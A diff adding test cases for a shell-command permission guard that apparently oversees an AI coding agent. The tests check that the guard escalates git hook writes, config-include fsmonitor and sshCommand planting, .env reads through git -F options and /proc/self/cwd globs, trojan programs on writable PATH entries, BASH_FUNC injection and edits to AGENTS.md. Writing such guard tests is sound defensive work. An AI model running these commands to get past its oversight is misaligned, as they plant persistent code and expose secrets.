+      assert.equal(r.kind, "classify", r.reason.slice(0, 300));
+      assert.match(r.reason, /longer than 4096/);
+    });
+    // At the limit the tails are read as before.
+    test("r4 B9-2: a word of 4096 characters is read tail by tail", async () => {
+      const c = `cd .git/hooks && cp -${pad("v", 4096 - "-t/proc/self/cwd".length)}t/proc/self/cwd ../../member`;
+      assert.equal(c.split(" ")[4].length, 4096);
+      const r = await inProject(one(), c);
+      assert.equal(r.kind, "ask", r.reason.slice(0, 300));
+      assert.match(r.reason, /\.git/);
+    });
+  });
+
+  describe("B9-3: git's other options that read a message or a list file attached", () => {
+    b7Each("B9-3", "ask", [
+      "git tag -aF.env v9", "git tag -F.env v9", "git tag -saF.env v9", "git tag -fF.env v1", "git notes add -F.env", "git notes append -F.env HEAD", "git notes --ref=x add -F.env", "git notes add -fF.env HEAD", "git notes edit -F.env",
+      "git merge -F.env main", "git merge -nF.env plain", "git merge --no-ff -F.env plain", "git commit-tree -F.env HEAD^{tree}", "git commit-tree -pHEAD -F.env HEAD^{tree}",
+      "git config -f.env --list", "git config -lf.env", "git fmt-merge-msg -F.env", "git -C src tag -F../.env v9",
+    ], one);
+    // A letter that takes a value of its own ends the cluster: the rest is that value.
+    b7Each("B9-3", ["allow", "classify"], ["git tag -mF.env v9", "git tag -uF.env -m x v9", "git notes add -mF.env", "git merge -mF.env plain", "git merge -sF.env plain", "git tag -l", "git config --list", "git config -l"], one);
+  });
+
+  describe("B9-4: every file an include names, whatever its condition", () => {
+    const write = "echo 'echo NEW' > fsm.sh";
+    test("r4 B9-4: a program key in a file a conditional include names: the model, whatever the condition", async () => {
+      const f = b9Fixture();
+      f.g("branch", "dev");
+      fs.writeFileSync(path.join(f.dir, ".git", "inc.cfg"), "[core]\n\tfsmonitor = ./fsm.sh\n");
+      for (const cond of ["onbranch:dev", "onbranch:dev*", "onbranch:dev2", "gitdir:/nonexistent/", "hasconfig:remote.*.url:https://example.invalid/**", "gitdir/i:/x/"]) {
+        f.g("config", `includeIf.${cond}.path`, "inc.cfg");
+        await b8After(f, write, ["git switch dev && git status", "git checkout dev && git add -A", "git status", "git switch -c dev2 && git status", "git branch dev3 && git switch dev3 && git status", "git switch dev; git diff"], "classify", /fsmonitor/);
+        f.g("config", "--unset", `includeIf.${cond}.path`);
+      }
+      // An unconditional one as well (git lists it itself; read the same way).
+      f.g("config", "include.path", "inc.cfg");
+      await b8After(f, write, ["git status"], "classify", /fsmonitor/);
+    });
+    test("r4 B9-4: includes inside included files are followed; a loop, a missing file, and a key it may not hold go to the model", async () => {
+      const f = b9Fixture();
+      fs.writeFileSync(path.join(f.dir, ".git", "inc.cfg"), "[include]\n\tpath = inc2.cfg\n");
+      fs.writeFileSync(path.join(f.dir, ".git", "inc2.cfg"), "[includeIf \"onbranch:x\"]\n\tpath = inc3.cfg\n");
+      fs.writeFileSync(path.join(f.dir, ".git", "inc3.cfg"), "[core]\n\tsshCommand = ./fsm.sh\n");
+      f.g("config", "includeIf.onbranch:nothing.path", "inc.cfg");
+      await b8After(f, B9_EDIT, ["git status", "git fetch"], "classify", /sshcommand/i);
+      // A file that includes itself: past the bound.
+      fs.writeFileSync(path.join(f.dir, ".git", "inc.cfg"), "[includeIf \"onbranch:y\"]\n\tpath = inc.cfg\n");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /include/);
+      // A file that is not there: git skips it, and (B10-10, Opus's minor point) it holds no keys.
+      f.g("config", "includeIf.onbranch:nothing.path", "missing.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "allow");
+      // One that git cannot read (it stops): the model.
+      fs.writeFileSync(path.join(f.dir, ".git", "unreadable.cfg"), "[status]\n\tshort = true\n", { mode: 0o000 });
+      f.g("config", "includeIf.onbranch:nothing.path", "unreadable.cfg");
+      if (process.getuid?.() !== 0) await b8After(f, B9_EDIT, ["git status"], "classify", /include/);
+      // A work-tree file, whatever the condition.
+      f.file("wt.cfg", "[user]\n\tname = x\n");
+      f.g("config", "includeIf.onbranch:nothing.path", "../wt.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /session can write/);
+    });
+    test("r4 B9-4: the bounds: a chain of eleven includes, or more than fifty files, go to the model", async () => {
+      const f = b9Fixture();
+      const at = (n: number) => path.join(f.dir, ".git", `chain${n}.cfg`);
+      for (let n = 1; n <= 11; n++) fs.writeFileSync(at(n), n < 11 ? `[includeIf "onbranch:nothing"]\n\tpath = chain${n + 1}.cfg\n` : "[status]\n\tshort = true\n");
+      f.g("config", "includeIf.onbranch:nothing.path", "chain2.cfg");
+      // Ten files deep is git's own limit, and read.
+      await b8After(f, B9_EDIT, ["git status"], "allow");
+      f.g("config", "includeIf.onbranch:nothing.path", "chain1.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /nested deeper/);
+      f.g("config", "--unset", "includeIf.onbranch:nothing.path");
+      fs.writeFileSync(path.join(f.dir, ".git", "wide.cfg"), Array.from({ length: 51 }, (_, n) => `[includeIf "onbranch:n${n}"]\n\tpath = chain11.cfg\n`).join(""));
+      f.g("config", "includeIf.onbranch:nothing.path", "wide.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /nested deeper/);
+    });
+    test("r4 B9-4: an included file with keys of the list changes nothing", async () => {
+      const f = b9Fixture();
+      fs.writeFileSync(path.join(f.dir, ".git", "inc.cfg"), "[core]\n\texcludesFile = x\n[status]\n\tshort = true\n");
+      f.g("config", "includeIf.onbranch:dev.path", "inc.cfg");
+      f.g("config", "include.path", "inc.cfg");
+      await b8After(f, B9_EDIT, ["git status", "git switch plain && git status", "git log -1"], "allow");
+    });
+  });
+
+  describe("B9-5: $PWD after a cd is the directory the command runs in", () => {
+    b7Each("B9-5", "ask", [
+      "cd .git/hooks && echo x > $PWD/pre-commit", "cd .git/hooks && echo x > ${PWD}/pre-commit", "cd .git/hooks && echo x > \"$PWD/pre-commit\"", "cd .git/hooks && echo x > \"${PWD}\"/pre-commit",
+      "cd .git/hooks && echo x >> $PWD/pre-commit", "cd .git/hooks && echo x | tee $PWD/pre-commit", "cd .git/hooks && touch $PWD/post-commit", "cd .git/hooks && mkdir $PWD/x",
+      "cd .git/hooks && rm $PWD/pre-commit", "cd .git/hooks && truncate -s0 $PWD/pre-commit", "cd .git/hooks && exec > $PWD/pre-commit", "cd .git && echo x > $PWD/config", "cd .git && echo x > $PWD/HEAD",
+      "cd src && cd ../.git && echo x > $PWD/hooks/pre-commit", "cd .git/hooks && echo x > $PWD/../config", "cd .git/hooks && gzip -c ../../f > $PWD/pre-commit.gz", "pushd .git/hooks && echo x > $PWD/pre-commit",
+      "cd src && cat $PWD/zzz", "cd src && echo x > $PWD/../AGENTS.md",
+    ], one);
+    // Where the directory is not known, or the word is no plain `$PWD/…`, the model.
+    // (Another expansion after it: not placed. A write of such a word the rules ask about on their
+    // own; `ls` of it is the model's here only.)
+    b7Each("B9-5", ["classify", "ask"], ["cd src && ls $PWD/$X", "cd src && echo x > $PWD/$X", "cd src && touch ${PWD}/`echo y`"], one);
+    b7Each("B9-5", ["classify", "ask"], ["cd \"$X\" && echo x > $PWD/y", "cd src && echo x > ${PWD:-.}/out.txt", "cd src && echo x > ${PWD%/*}/out.txt", "cd src && echo x > x$PWD", "for d in a; do cd .git/hooks; echo x > $PWD/pre-commit; done"], one);
+    b7Each("B9-5", "allow", ["cd src && echo x > $PWD/out.txt", "cd src && echo x > \"$PWD/out.txt\"", "echo x > $PWD/out.txt", "cd src && ls $PWD", "echo $PWD", "cd src && echo $PWD"], one);
+    // (The rules read `$PWD` after a cd as a name known only at run time: their verdict stands.)
+    b7Each("B9-5", "classify", ["cd src && cat $PWD/main.c"], one);
+    test("r4 B9-5: a write to $PWD/… after a cd is recorded where it lands", async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      assert.equal((await b7Kind(f.dir, "cd src && echo x > $PWD/b9-out.txt", s)).kind, "allow");
+      assert.ok(s.touched.has(path.join(fs.realpathSync(f.dir), "src", "b9-out.txt")), [...s.touched].join(", "));
+      assert.ok(!s.unlisted.length, s.unlisted.join(", "));
+    });
+  });
+
+  describe("B9-6: tar's archive when it creates, and the compressors' output options", () => {
+    b7Each("B9-6", "ask", [
+      "tar -cf AGENTS.md f", "tar -cf .git/hooks/pre-commit f", "tar -cf .git/config f", "tar -czf .git/hooks/pre-commit f", "tar -c --file=.git/hooks/pre-commit f", "tar --create --file .git/hooks/pre-commit f",
+      "tar -rf AGENTS.md f", "tar -uf AGENTS.md f", "tar --append -f AGENTS.md f", "tar --update --file=AGENTS.md f", "tar cf AGENTS.md f", "tar cvzf .git/hooks/pre-commit f", "tar -cfAGENTS.md f", "tar -Af AGENTS.md a.tar", "tar --delete -f AGENTS.md f",
+      "tar -C src -cf AGENTS.md main.c", "cd src && tar -cf ../.git/hooks/x.tar ../f", "cd .git/hooks && tar -cf x.tar ../../f", "bash -c 'tar -cf AGENTS.md f'", "timeout 5 tar -cf AGENTS.md f", "gtar -cf AGENTS.md f",
+      "zstd -f f -o .git/hooks/pre-commit", "zstd -qfo .git/hooks/pre-commit f", "zstd -f f -o=.git/hooks/pre-commit", "zstd -f f --output-dir-flat .git/hooks", "zstd -f f --output-dir-flat=.git/hooks", "zstd -f f --output-dir-mirror .git/hooks", "zstd -f f -o AGENTS.md",
+      "unzstd -f f.zst -o .git/hooks/pre-commit", "pzstd -f f -o .git/hooks/pre-commit", "brotli -f f -o .git/hooks/pre-commit", "brotli -f f --output=AGENTS.md", "lzip -f -o .git/hooks/pre-commit f", "lzop -f -o .git/hooks/pre-commit f", "lzop -f -p.git/hooks f", "lz4 -f f .git/hooks/pre-commit",
+      "zip AGENTS.md f", "zip -r .git/hooks/x.zip src", "zip -O AGENTS.md a.zip f",
+      // An option tar's table does not hold: the plain reading.
+      "tar -c --b9-no-such-option -f AGENTS.md f", "tar -cz --b9-no-such-option -fAGENTS.md f",
+    ], one);
+    b7Each("B9-6", "allow", ["tar -czf out.tgz src", "tar -cf b.tar f", "tar -cf - f", "tar -C src -czf out.tgz main.c", "tar -tf a.tar", "tar -xf a.tar", "zstd -f f -o f.zst", "zstd -f f", "zstd -dc f.zst", "zip -r b9.zip src"], one);
+    test("r4 B9-6: the archive a create writes is the session's", async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      assert.equal((await b7Kind(f.dir, "tar -C src -czf b9-out.tgz main.c", s)).kind, "allow");
+      assert.ok(s.touched.has(path.join(fs.realpathSync(f.dir), "b9-out.tgz")), [...s.touched].join(", "));
+      assert.equal((await b7Kind(f.dir, "zstd -f f -o b9-out.zst", s)).kind, "allow");
+      assert.ok(s.touched.has(path.join(fs.realpathSync(f.dir), "b9-out.zst")), [...s.touched].join(", "));
+    });
+  });
+
+  describe("B9-7: a glob behind /proc/self/cwd asks", () => {
+    b7Each("B9-7", "ask", [
+      "cd src && cat /proc/self/cwd/../.e*", "cd src && cat /proc/self/cwd/../.en?", "cd src && cat /proc/thread-self/cwd/../.e*", "cd src && cat /proc/./self/cwd/../.e*", "cd src && cat //proc/self/cwd/../.e*",
+      "cd src && cat /proc/self/cwd//../.e*", "cd src && cat /proc/{self,thread-self}/cwd/../.e*", "cd src && for f in /proc/self/cwd/../.e*; do cat \"$f\"; done", "cd src && cat /proc/self/cwd/../.[e]nv",
+      "cat /proc/self/cwd/.e*", "cd src && cat ../mylink/../.e*", "cat mylink/.e*", "cd src && cat /proc/$$/cwd/../.e*", "cd src && cat /proc/1/cwd/*", "cd src && head -c9 /proc/self/cwd/../.e*", "cd src && cat -- /proc/self/cwd/../.e*", "cd src && grep -r x --include=/proc/self/cwd/../.e*",
+    ], one);
+    b7Each("B9-7", "allow", ["cat /proc/cpuinfo", "cat /proc/self/cwd/f", "cd src && cat /proc/self/cwd/main.c", "ls src/*.c"], one);
+  });
+
+  describe("B9-8: PATH with an entry the session can write before the system's: no safe list after a write", () => {
+    const LIST = ["zcat f.gz", "gunzip -c f.gz", "egrep x f", "fgrep x f", "tar -xzf a.tgz", "tar -tf a.tar", "tar -cJf o.txz f", "git fetch", "git ls-remote origin", "git commit -m x", "git status", "patch -e f x.ed", "cat f", "ls", "sort f", "./scripts/build.sh", "env cat f"];
+    const OWN = ["echo x", "true", "cd src", "[ -f f ]", "test -f f", "if true; then echo y; fi", "printf x"];
+    test("r4 B9-8: every program goes to the model, naming the entry; bash's own words stay", async () => {
+      const f = b9Fixture();
+      const t = fs.mkdtempSync(path.join(tmp, "b9-path-"));
+      const was = process.env.PATH;
+      try {
+        for (const [bent, named] of [[`${f.dir}/bin:${was}`, `${f.dir}/bin`], [`bin:${was}`, "bin"], [`:${was}`, "an empty entry"], [`.:${was}`, "."], [`${t}:${was}`, t], [`/usr/local/bin:./bin:/usr/bin:/bin`, "./bin"], [`${f.dir}/gl/../bin:${was}`, `${f.dir}/gl/../bin`]] as const) {
+          process.env.PATH = bent;
+          for (const c of LIST) {
+            const s = new SessionState(f.dir);
+            assert.equal((await b7Kind(f.dir, B9_EDIT, s)).kind, "allow", bent);
+            const r = await b7Kind(f.dir, c, s);
+            assert.equal(r.kind, "classify", `${bent}: ${r.reason}`);
+            assert.ok(r.reason.includes(`PATH holds ${named}`), `${bent}: ${r.reason}`);
+          }
+          await b8After(f, B9_EDIT, OWN, "allow");
+          // In a session that has written nothing, nothing changes.
+          for (const c of ["zcat f.gz", "egrep x f", "cat f", "git status"]) assert.equal((await b7Kind(f.dir, c)).kind, "allow", `${bent}: ${c}`);
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B9-8: the call that writes a program into such an entry and runs a safe name that finds it", async () => {
+      const f = b9Fixture();
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = `${f.dir}/bin:${was}`;
+        for (const c of ["cp helper.sh bin/gzip && chmod +x bin/gzip; zcat f.gz", "cp helper.sh bin/grep && chmod +x bin/grep; egrep x f"]) {
+          const r = await b7Kind(f.dir, c);
+          assert.equal(r.kind, "classify", r.reason);
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    // (B10-1, the maintainer's decision: such an entry after the system's directories counts as
+    // well; it is held in r4 B10-1.)
+    test("r4 B9-8: a plain PATH changes nothing", async () => {
+      const f = b9Fixture();
+      const was = process.env.PATH;
+      try {
+        for (const plain of [was!, "/usr/local/bin:/usr/bin:/bin", `~/b9-bin:${was}`]) {
+          process.env.PATH = plain;
+          await b8After(f, B9_EDIT, ["zcat f.gz", "egrep x f", "tar -tf a.tar", "cat f", "ls", "git status", ...OWN], "allow");
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B9-8: a remote URL whose scheme is not git's own names a program, git-remote-<scheme>", async () => {
+      const f = b9Fixture();
+      // (git compares the scheme case and all: `HTTPS://` runs git-remote-HTTPS, by PATH.)
+      for (const url of ["foo://h/x", "FOO://h/x", "x-y.z+w://h/x", "gcrypt://h/x", "HTTPS://example.invalid/x.git", "SSH://h/x"]) {
+        f.g("remote", "add", "b9", url);
+        await b8After(f, B9_EDIT, ["git fetch b9", "git ls-remote b9", "git status"], "classify", /git-remote-|scheme/);
+        f.g("remote", "remove", "b9");
+      }
+      f.g("config", "url.foo://h/.insteadOf", "https://example.invalid/");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /scheme/);
+      f.g("config", "--unset", "url.foo://h/.insteadOf");
+      f.g("config", "url.HTTPS://h/.insteadOf", "https://example.invalid/");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /scheme HTTPS/);
+      f.g("config", "--unset", "url.HTTPS://h/.insteadOf");
+      for (const url of ["https://example.invalid/x.git", "http://example.invalid/x.git", "ssh://h/x", "git://h/x", "git+ssh://h/x", "ssh+git://h/x", "ftp://h/x", "ftps://h/x", "file:///srv/x", "h:x", "user@h:x", "/srv/x.git", "../x.git"]) {
+        f.g("remote", "add", "b9", url);
+        await b8After(f, B9_EDIT, ["git status"], "allow");
+        f.g("remote", "remove", "b9");
+      }
+    });
+  });
+
+  describe("B9-9: hooks that exist before the session", () => {
+    const hook = (f: B7, name: string, mode = 0o755, dir = path.join(f.dir, ".git", "hooks")) => {
+      fs.mkdirSync(dir, { recursive: true });
+      fs.writeFileSync(path.join(dir, name), "#!/bin/sh\n. ./helper.sh\n", { mode });
+    };
+    test("r4 B9-9: only .sample hooks: nothing changes", async () => {
+      const f = b9Fixture();
+      assert.ok(fs.readdirSync(path.join(f.dir, ".git", "hooks")).every((n) => n.endsWith(".sample")));
+      await b8After(f, B9_EDIT, ["git commit -m x", "git status", "git add f", "git checkout plain", "git switch plain", "git branch x", "git fetch", "git log -1"], "allow");
+    });
+    test("r4 B9-9: a pre-commit hook (the pre-commit framework's): git commit after a write goes to the model, naming it", async () => {
+      const f = b9Fixture();
+      fs.writeFileSync(path.join(f.dir, ".git", "hooks", "pre-commit"), "#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\nINSTALL_PYTHON=/usr/bin/python3\nARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)\nexec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"\n", { mode: 0o755 });
+      await b8After(f, B9_EDIT, ["git commit -m x", "git commit -am x", "git commit --amend -m x", "git -C src commit -m x"], "classify", /pre-commit/);
+      // `--no-verify` and `-n` skip it.
+      await b8After(f, B9_EDIT, ["git commit --no-verify -m x", "git commit -n -m x", "git status", "git add f", "git checkout plain", "git log -1"], "allow");
+      // `--verify` after them runs it again.
+      await b8After(f, B9_EDIT, ["git commit --no-verify --verify -m x"], "classify", /pre-commit/);
+      // In a fresh session nothing changes.
+      assert.equal((await b7Kind(f.dir, "git commit -m x")).kind, "allow");
+    });
+    test("r4 B9-9: a hook file git would not run (not executable, a .sample) changes nothing", async () => {
+      const f = b9Fixture();
+      hook(f, "pre-commit", 0o644);
+      hook(f, "post-checkout.sample");
+      await b8After(f, B9_EDIT, ["git commit -m x", "git checkout plain"], "allow");
+    });
+    test("r4 B9-9: each hook with the commands that run it", async () => {
+      for (const [name, runs, not] of [
+        ["post-checkout", ["git checkout plain", "git switch plain", "git restore --staged f", "git bisect reset"], ["git commit -m x", "git status"]],
+        ["commit-msg", ["git commit -m x"], ["git commit --no-verify -m x", "git status"]],
+        ["prepare-commit-msg", ["git commit -m x", "git commit --no-verify -m x"], ["git status"]],
+        ["post-commit", ["git commit -m x", "git commit -n -m x"], ["git status"]],
+        ["post-rewrite", ["git commit --amend -m x"], ["git status"]],
+        ["reference-transaction", ["git branch x", "git tag v9", "git fetch", "git commit -m x", "git switch plain", "git reset", "git stash"], ["git status", "git log -1", "git diff"]],
+        ["post-index-change", ["git status", "git add f", "git rm --cached f", "git reset", "git diff", "git checkout plain", "git commit -m x"], ["git log -1", "git show HEAD", "git branch x"]],
+        ["pre-auto-gc", ["git commit -m x", "git fetch", "git gc --auto"], ["git status", "git gc", "git log -1"]],
+      ] as const) {
+        const f = b9Fixture();
+        hook(f, name);
+        await b8After(f, B9_EDIT, [...runs], "classify", new RegExp(name));
+        await b8After(f, B9_EDIT, [...not], "allow");
+        fs.rmSync(f.dir, { recursive: true, force: true });
+      }
+    });
+    test("r4 B9-9: the table, and what --no-verify skips", () => {
+      const runs = (sub: string, ...rest: string[]) => new Set((decideModule as any).gitHooksRun(sub, rest) as string[]);
+      // (A push asks on its own here; the table says what it would run.)
+      assert.ok(runs("push", "origin", "x").has("pre-push"));
+      assert.ok(!runs("push", "--no-verify", "origin", "x").has("pre-push"));
+      assert.ok(runs("push", "--no-verify", "--verify").has("pre-push"));
+      const merge = runs("merge", "--no-verify", "x");
+      assert.ok(!merge.has("pre-merge-commit") && !merge.has("commit-msg") && merge.has("prepare-commit-msg") && merge.has("post-merge"));
+      assert.ok(runs("merge", "-n", "x").has("pre-merge-commit"));
+      const commit = runs("commit", "-n", "-m", "x");
+      assert.ok(!commit.has("pre-commit") && !commit.has("commit-msg") && commit.has("post-commit") && commit.has("prepare-commit-msg"));
+      assert.ok(runs("commit", "-m", "x", "--", "-n").has("pre-commit"));
+      const am = runs("am", "-n", "x.patch");
+      assert.ok(!am.has("pre-applypatch") && !am.has("applypatch-msg") && am.has("post-applypatch"));
+      assert.ok(runs("gc", "--auto").has("pre-auto-gc") && !runs("gc").has("pre-auto-gc"));
+      assert.ok(runs("worktree", "add", "x").has("post-checkout") && runs("clone", "x").has("post-checkout"));
+      assert.deepEqual([...runs("log")], []);
+    });
+    test("r4 B9-9: the hooks directory of the user's core.hooksPath", async () => {
+      const f = b9Fixture();
+      const dir = fs.mkdtempSync(path.join(tmp, "b9-hooks-"));
+      hook(f, "pre-commit", 0o755, dir);
+      const global = path.join(dir, "gitconfig");
+      fs.writeFileSync(global, `${fs.readFileSync(process.env.GIT_CONFIG_GLOBAL!, "utf8")}\n[core]\n\thooksPath = ${dir}\n`);
+      const was = process.env.GIT_CONFIG_GLOBAL;
+      try {
+        process.env.GIT_CONFIG_GLOBAL = global;
+        await b8After(f, B9_EDIT, ["git commit -m x"], "classify", /pre-commit/);
+        await b8After(f, B9_EDIT, ["git status"], "allow");
+      } finally {
+        process.env.GIT_CONFIG_GLOBAL = was;
+      }
+      // The repository's own .git/hooks is then not where git looks.
+      hook(f, "post-checkout");
+      await b8After(f, B9_EDIT, ["git checkout plain"], "classify", /post-checkout/);
+    });
+  });
+
+  describe("B9-10: the minor points", () => {
+    test("r4 B9-10: a configuration entry of another scope than the user's own is held to the repository's list (GIT_CONFIG_PARAMETERS)", async () => {
+      const f = b9Fixture();
+      const was = process.env.GIT_CONFIG_PARAMETERS;
+      try {
+        process.env.GIT_CONFIG_PARAMETERS = "'core.fsmonitor'='./helper.sh'";
+        await b8After(f, B9_EDIT, ["git status"], "classify", /fsmonitor/);
+        process.env.GIT_CONFIG_PARAMETERS = "'status.short'='true'";
+        await b8After(f, B9_EDIT, ["git status"], "allow");
+      } finally {
+        if (was === undefined) delete process.env.GIT_CONFIG_PARAMETERS;
+        else process.env.GIT_CONFIG_PARAMETERS = was;
+      }
+    });
+    test("r4 B9-10: BASH_FUNC_command_not_found_handle%% in the environment: a safe name is not the tool", async () => {
+      const f = one();
+      const key = "BASH_FUNC_command_not_found_handle%%";
+      try {
+        process.env[key] = "() {  ./helper.sh\n}";
+        await b8After(f, B9_EDIT, ["tree", "xxd f", "cat f"], "classify", /function the environment/);
+      } finally {
+        delete process.env[key];
+      }
+      await b8After(f, B9_EDIT, ["tree", "cat f"], "allow");
+    });
+    test("r4 B9-10: functionNames reads `function name {`", () => {
+      const names = (guardModule as any).functionNames("function sort { echo hi; }; sort f") as Set<string>;
+      assert.ok(names.has("sort"), [...names].join(","));
+      assert.ok((guardModule as any).functionNames("function\tuniq\n{ :; }").has("uniq"));
+    });
+    test("r4 B9-10: a kept moment of another owner is no moment", () => {
+      const id = `b9-owner-${process.pid}`;
+      const first = new SessionState(repo, id);
+      assert.ok(first.moment.at > 0n);
+      const real = process.getuid;
+      try {
+        const other = process.getuid!() + 4242;
+        process.getuid = () => other;
+        const again = new SessionState(repo, id);
+        assert.equal(again.moment.at, 0n);
+      } finally {
+        process.getuid = real;
+      }
+      assert.equal(new SessionState(repo, id).moment.at, first.moment.at);
+    });
+    test("r4 B9-8: B8's walk of PATH, asked directly (argvGuard asks it only where no entry is bent)", () => {
+      const f = one();
+      const p = (guardModule as any).pathFinds;
+      const inProject = (x: string) => x.startsWith(fs.realpathSync(f.dir)) || x.startsWith(f.dir);
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = `${f.dir}/bin:/usr/bin:/bin`;
+        assert.match(p("sort", [f.dir], inProject, () => false)?.why ?? "", /PATH finds at/);
+        assert.match(p("uniq", [f.dir], inProject, (_d: string, file: string) => file.endsWith("/bin/uniq"))?.why ?? "", /PATH looks for in/);
+        assert.equal(p("uniq", [f.dir], inProject, () => false), undefined);
+        process.env.PATH = `bin:/usr/bin:/bin`;
+        assert.match(p("sort", [f.dir], inProject, () => false)?.why ?? "", /PATH finds at/);
+        assert.equal(p("sort", [path.join(f.dir, "src")], inProject, () => false), undefined);
+        process.env.PATH = `/usr/bin:/bin:${f.dir}/bin`;
+        assert.equal(p("sort", [f.dir], inProject, () => false), undefined);
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B9-10: a relative entry of PATH where the directory is not known", () => {
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = "/usr/bin:/bin:rel";
+        const r = (guardModule as any).pathFinds("b9-not-installed-tool", undefined, () => false, () => false);
+        assert.match(r?.why ?? "", /in a directory the check cannot tell/);
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+  });
+});
+
+// ---- Group B, tenth pass ----
+const b10Fixture = (name = "b10-") => {
+  const f = b9Fixture(name);
+  f.file("dict", "dict\n");
+  f.file("p.zst", "not really zstd\n");
+  f.file("in", "in\n");
+  fs.symlinkSync("/proc", path.join(f.dir, "pr"));
+  f.g("add", "-A");
+  f.g("commit", "-qm", "b10");
+  return f;
+};
+// Each command in a session of its own, after one write of the session's into a temp directory
+// only (a shell write there), as b8After does for a write in the project.
+const b10AfterTemp = async (f: B7, commands: string[], want: Want | Want[], also?: RegExp) => {
+  const t = fs.mkdtempSync(path.join(tmp, "b10-tempwrite-"));
+  for (const c of commands) {
+    const s = new SessionState(f.dir);
+    const w = await b7Kind(f.dir, `printf 'x\\n' > ${t}/b10-made`, s);
+    assert.equal(w.kind, "allow", w.reason);
+    const r = await b7Kind(f.dir, c, s);
+    assert.ok([want].flat().includes(r.kind), r.reason);
+    if (also) assert.match(r.reason, also, r.reason);
+  }
+};
+const withEnv = async (vars: Record<string, string | undefined>, fn: () => Promise<void>) => {
+  const was = Object.fromEntries(Object.keys(vars).map((k) => [k, process.env[k]]));
+  try {
+    for (const [k, v] of Object.entries(vars)) {
+      if (v === undefined) delete process.env[k];
+      else process.env[k] = v;
+    }
+    await fn();
+  } finally {
+    for (const [k, v] of Object.entries(was)) {
+      if (v === undefined) delete process.env[k];
+      else process.env[k] = v;
+    }
+  }
+};
+
+describe("r4 B10", () => {
+  let shared: B7;
+  const one = () => (shared ??= b10Fixture("b10-shared-"));
+
+  describe("B10-1: an entry the session can write, anywhere in PATH", () => {
+    // Programs a safe program runs by PATH that this machine lacks (ed, lzip), the helper a URL
+    // names, and ordinary ones.
+    const RUN = ["patch -e f x.ed", "tar --lzip -cf o.tlz f", "tar -tf a.tar", "git ls-remote foo://x/y", "git fetch foo://x/y", "git status", "cat f", "zcat f.gz"];
+    const OWN = ["echo x", "true", "cd src", "test -f f", "printf x"];
+    test("r4 B10-1: after the system's directories: every program goes to the model after a write, naming the entry", async () => {
+      const f = b10Fixture();
+      const t = fs.mkdtempSync(path.join(tmp, "b10-pbin-"));
+      const was = process.env.PATH!;
+      try {
+        for (const [bent, named] of [[`/usr/bin:/bin:${f.dir}/bin`, `${f.dir}/bin`], ["/usr/bin:/bin:./node_modules/.bin", "./node_modules/.bin"], ["/usr/bin:/bin:", "an empty entry"], [`/usr/bin:/bin:${t}`, t], [`${was}:bin`, "bin"], [`${was}:.`, "."], [`/usr/bin:${f.dir}/bin:/bin`, `${f.dir}/bin`]] as const) {
+          process.env.PATH = bent;
+          for (const c of RUN) {
+            const s = new SessionState(f.dir);
+            assert.equal((await b7Kind(f.dir, B9_EDIT, s)).kind, "allow", bent);
+            const r = await b7Kind(f.dir, c, s);
+            assert.equal(r.kind, "classify", `${bent}: ${r.reason}`);
+            assert.ok(r.reason.includes(`PATH holds ${named}`), `${bent}: ${r.reason}`);
+          }
+          await b8After(f, B9_EDIT, OWN, "allow");
+          // A fresh session: as before.
+          for (const c of ["tar -tf a.tar", "cat f", "git status", "zcat f.gz"]) assert.equal((await b7Kind(f.dir, c)).kind, "allow", `${bent}: ${c}`);
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B10-1: the call that plants the program after the system's directories and runs a safe name that runs it", async () => {
+      const f = b10Fixture();
+      const was = process.env.PATH!;
+      try {
+        for (const bent of [`/usr/bin:/bin:${f.dir}/bin`, "/usr/bin:/bin:bin", "/usr/bin:/bin:"]) {
+          process.env.PATH = bent;
+          const at = bent.endsWith(":") ? "." : "bin";
+          for (const c of [`cp helper.sh ${at}/ed && chmod +x ${at}/ed; patch -e f x.ed`, `cp helper.sh ${at}/lzip && chmod +x ${at}/lzip; tar --lzip -cf o.tlz f`, `cp helper.sh ${at}/git-remote-foo && chmod +x ${at}/git-remote-foo && git ls-remote foo://h/r`]) {
+            const r = await b7Kind(f.dir, c);
+            assert.equal(r.kind, "classify", `${bent}: ${r.reason}`);
+          }
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B10-1: a PATH of fixed directories outside the project and the temp directories changes nothing", async () => {
+      const f = b10Fixture();
+      const was = process.env.PATH!;
+      try {
+        for (const plain of [was, "/usr/local/bin:/usr/bin:/bin", `~/b10-bin:${was}`, `${was}:~/b10-bin`, `${was}:${os.homedir()}/b10-bin`]) {
+          process.env.PATH = plain;
+          await b8After(f, B9_EDIT, ["zcat f.gz", "tar -tf a.tar", "cat f", "ls", "git status", ...OWN], "allow");
+        }
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B10-1: an entry outside both that leads into a temp directory by a link counts (bentPath's walk)", async () => {
+      const f = b10Fixture();
+      const t = fs.mkdtempSync(path.join(tmp, "b10-linked-"));
+      const link = path.join(os.homedir(), `b10-link-${process.pid}`);
+      fs.rmSync(link, { force: true });
+      fs.symlinkSync(t, link);
+      const was = process.env.PATH!;
+      try {
+        for (const p of [`${link}:${was}`, `${was}:${link}`]) {
+          process.env.PATH = p;
+          assert.equal((guardModule as any).bentPath(() => false), link, p);
+          await b8After(f, B9_EDIT, ["cat f", "git status"], "classify", /PATH holds \S*b10-link-/);
+        }
